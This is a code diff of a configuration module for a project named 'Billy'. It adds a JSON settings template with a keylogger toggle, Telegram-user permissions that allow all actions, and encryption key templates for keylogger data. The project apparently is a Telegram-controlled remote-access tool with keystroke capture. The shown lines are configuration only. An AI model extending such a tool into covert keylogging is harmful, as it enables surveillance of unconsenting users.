@@ -20,8 +20,21 @@ network_token_value = "token = '{network_token}'"
 branch_name_path = 'BillyHerrington/branch.py'
 branch_name_value = "branch_name = '{branch_name}'"
 
-permissions_file_path = 'NetworkStructure/permissions.json'
-permissions_file_value = '{{"{telegram_id}": {{"allowed": ["ALL"], "forbidden": []}}}}'
+configuration_file_path = 'NetworkStructure/configuration'
+configuration_file_value = """{{
+  "General": {{
+    "Keylogger": 0
+  }},
+  "Users": {{
+    "{telegram_id}": {{
+      "language": "eng",
+      "permissions": {{
+        "allowed": ["ALL"],
+        "forbidden": []
+      }}
+    }}
+  }}
+}}"""
 
 sample_dir_path = 'NetworkStructure/'
 
@@ -85,3 +98,14 @@ forge_api_latest_release = "https://api.github.com/repos/serabobina/Billy/releas
 comment_network_path = BillyHerrington_network_directory + \
     "{branch_name}/comment.txt"
 comment_path = "comment.txt"
+
+encryption_keys_path = 'BillyHerrington/encryption_keys.py'
+
+encryption_alth = [chr(i) for i in range(127960, 128260)]
+encryption_key_length = 24
+
+encryption_keys_sample = '''
+configuration_ek = "{configuration_ek}"
+salt = "{salt}"
+keylogger_ek = "{keylogger_ek}"
+'''
